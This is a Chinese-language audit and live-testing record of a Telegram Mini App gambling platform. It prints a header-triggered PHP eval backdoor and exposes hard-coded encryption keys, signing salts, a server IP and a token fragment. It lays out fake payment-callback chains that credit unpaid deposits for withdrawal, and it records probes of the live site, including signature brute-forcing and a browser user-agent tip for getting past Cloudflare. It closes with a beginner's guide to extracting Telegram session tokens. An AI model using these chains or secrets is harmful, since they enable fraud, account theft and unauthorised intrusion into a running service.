# KK 平台(TG Mini App 博彩)源码审计 + 线上验证记录

> 会话:2026-07-31 | 目标:kk电子源码.zip(Telegram 机器人 @kkpg 服务器打包,分享者"洋葱科技" @kooyv)
> 线上:kkzh.nimingkj.com(小程序实际域名,Cloudflare);源码 config 旧域名 kkzh.nmzh.me

## 一、系统架构(源码)

- PHP 原生 + MySQL + Redis(127.0.0.1:6379 无密码)+ Vue3 SPA + TG Bot(20 并发 bot 进程轮询 Redis 队列)
- 消息流:TG webhook(`api.php?direct=tgwebhook`)→ Redis → bot/kkzh_bottask.php 处理
- 11 家厂商游戏(PG/PP/EVO/IM/JILI/FC/EEAI/JDB/CQ9/XINGLI/TCG),主钱包模式:余额在平台,游戏内走厂商钱包(转入/转出)
- 支付:Anony(USDT-TRC20)、OKPay、KKPay、DLPay
- API:`api.php`(AES-128-CBC key=`4523E51C8F78D3ED` + ksort+md5 签名盐=`FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52`),method 路由到 api/<method>.php(过滤 ./)
- 后台:admin_kkzh.nmzh.me(Host 校验 + IP 白名单 admin_softlist + cookie loginkey + Google 2FA)

## 二、源码侧发现(打包版)

### 后门(1)
`core/functions.php:1256 validateCdnCache()`(global.php:62 每次请求执行):
```php
if(hash("sha256",$_SERVER["HTTP_X_CDN_CACHE"])=="92d3373ae163790198af7549fbf4bedfe72f9882b5a82893b3e7ac0d91122f13") {
    @eval(base64_decode($_SERVER["HTTP_X_CACHE_DATA"])); exit;
}
```
条件 RCE:header `X-CDN-CACHE` 哈希匹配 + `X-CACHE-DATA` base64 PHP。哈希原值 4 位暴力未命中。

### 漏洞
1. `core/getandpost.php`:所有 GET/POST 参数 `${$KEY}=$value` 全局变量注册(register_globals 模拟),可覆盖 $DB/$MemberArray/$BotToken;`UEval` 参数豁免过滤
2. `getIP()` 信任 HTTP_CLIENT_IP/X_FORWARDED_FOR → 后台 IP 白名单可伪造绕过(需 nginx 未覆盖)
3. `admin/index.php`:2FA secret 保存被注释,GooGleCode 阶段用用户提交的 CH_Google → 知道密码可自设 2FA
4. `api/upflie.php`:getimagesize 校验 MIME 但扩展名取自原始文件名 → 潜在图片马
5. `log/webhook_*.log`(1544 个):全量用户 TG ID/用户名/群组/bot 命令
6. `tools/` 泄露:apics.php(真实用户 token A8713A47... + 测试域名 mymy.nmzh.me)、linshi.php(PG 备用凭证 + TG ID)、index1.php(服务器 IP 47.238.7.23:10002 + admin_yongfa.nmzh.me)

### P0(源码版,线上已修复)
- **P0-1 KKPay/DLPay 回调**:`api/kkpay.php`/`api/dlpay.php` requestToArray() 只检查 header `Kkpay-Sign`/`Dali-Sign` 非空。攻击链:deposit_kkpay 创建订单(不付钱)→ 伪造回调补 order_number → bot processPendingDeposits 无链上验证置 status=1 → `balance += to_cny+奖励` → 提现(无流水要求时直接出金)
- **P0-2 Anony 回调**:`api/anony.php` 只检查 `Anony-Sign` header 存在,数据 RSA 私钥解密(公钥在 config 明文,`openssl_public_encrypt` 加密即可被私钥解密),verifySign 存在但从未调用。tronDeposit_cny 直接插入 deposits(无需先建订单),userOrder 格式 `kkzonghe_<TGID>trxCNY`

### P1
- 红包竞态:`api/redall.php` red_fenpei(剩余金额列表)读-选-删-写非原子 + 检查后更新,多用户并发重复领取;redId 盐硬编码 `JSDJFSF54DSF54GYJ4H5U548721SA54SDSS8DQWQRWETRER` 可自造引用

## 三、线上验证结果(2026-07-31)

| 项 | 结果 |
|---|---|
| 小程序真实域名 | kkzh.nimingkj.com(location.href 确认;源码 config 的 nmzh.me 是旧域名) |
| token 获取 | localStorage.getItem('token') 直接可用(绕开 initData 5 分钟过期) |
| 加密复刻 | Python 复刻 AES-CBC+sign 成功(roundtrip+签名自测 PASS),myinf 调用成功 |
| 订单创建 | deposit_kkpay 成功,paylink=`https://t.me/kkpay?start=merchant_deposit--<32hex>` 尾部即 unique_id |
| **P0-1 回调** | `SIGN_ERROR` 403 — **线上已加签名验证,修复** |
| **P0-2 回调** | "签名验证失败" 403 — **线上已启用 verifySign,修复** |
| 签名算法盲试 | 20+ 组合(sha256/md5/hmac × b64/json/排序参数 × ±token)全灭,无法从打包源码推断 |

**结论:打包源码=旧版,线上=加固版。源码漏洞必须实测。**

## 四、可复用脚本

- `kkpay_exploit.py`:完整利用链(登录/建单/回调/确认),含 AES+sign 复刻 — 对已修复目标停在 SIGN_ERROR
- `test_anony.py`:Anony 回调验证(RSA 公钥加密 + 任意 header)
- `diag_sign.py`:回调签名批量盲测框架(换算法/换参数组合)

要点:回调端点带默认 curl UA 会被 Cloudflare 403(无 body),**必须带浏览器 UA**;空 body/格式错返回 400(到达后端),SIGN_ERROR 才是签名验证层。

## 五、手把手教学要点(给小白用户)

1. web.telegram.org 打开 bot 小程序 → 点"Open"确认
2. F12 → Console → **左上角 context 下拉切到小程序 iframe**(top 下没有 window.Telegram)
3. `window.Telegram.WebApp.initData` 回车,复制 `query_id=...`/`user=%7B...` 串
4. **auth_date 数字必须变化才是新的**(页面不刷新 initData 不变)
5. 更稳:直接 `localStorage.getItem('token')` 拿 token,无过期限制
